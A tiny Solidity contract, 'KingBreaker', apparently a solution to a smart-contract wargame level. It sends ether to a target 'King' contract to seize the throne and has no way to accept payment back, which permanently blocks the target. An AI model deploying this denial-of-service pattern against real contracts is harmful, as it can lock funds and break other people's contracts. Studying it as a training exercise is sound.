pragma solidity 0.8.0;

contract KingBreaker{
    address payable public kingContract;
    constructor(address payable _kingContractAddress) payable {
        kingContract = _kingContractAddress;
        kingContract.call{value: msg.value, gas: 100000}("");
    }
}